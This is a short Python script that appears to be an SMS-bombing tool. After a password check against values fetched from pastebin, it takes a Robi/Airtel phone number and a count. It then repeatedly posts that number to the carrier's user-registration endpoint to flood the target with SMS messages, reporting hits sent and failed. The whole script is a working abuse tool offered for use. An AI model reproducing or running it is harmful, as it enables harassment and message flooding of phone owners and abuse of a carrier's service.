import os
import requests
import time
from requests.structures import CaseInsensitiveDict
# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'

print ("\033[32m")
usern=requests.get("https://pastebin.com/raw/n9pUk3f3")
passw=requests.get("https://pastebin.com/raw/CLqHHHWs")
usern=usern.text
passw=passw.text

inpuser=str(input("		Enter Your Username : "))
inppass=str(input("		Enter Your Password : "))

if usern==inpuser and passw==inppass:
	print (" [√] User & Password Correct")
	pass
else:
	print (" [×] Wrong User & Password")
	sys.exit()
	print ("\033[33m")
os.system("clear")
print ("			 Wellcome ")

print ("\033[32m")
number  = str(input("       [>] Enter The RoBi/Airtel Number: "))

amount = int(input("        [>] Choice Your Pin Amount : "))

api = "https://trans.robi.com.bd/UserService/Userregistration"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data= """{
  \"firstName\": \"\",
  \"lastName\": \"\",
  \"email\": \"\",
  \"mobileNumber\": \""""+number+"""\",
  \"UserTypeID\": \"45\",
  \"MDUserStatusID\": \"7867\",
  \"UserForm\": \"1\"
}"""
totalhit,nsent,sent,=0,0,0
for i in range(amount):
    r=str(requests.post(api, headers=headers, data=data).status_code)
    totalhit+=1
    if r=="200":
        print(green + "[✓] "+str(i+1)+" SMS Sent.")
        sent+=1
    else:
        print(red+"[×] "+str(i+1)+" SMS Not Sent.")
        nsent+=1
print(cyan + "\n\n\t\t[•] Total Hits : " + yellow + str(totalhit))
print(green + "\n\t\t[✓] Total Sent : " + yellow + str(sent))
print(red + "\n\t\t[×] Total Not Sent : " + yellow + str(nsent) + "\n")
print(cyan + "\n\n\t\t  [✓] All Done!\n")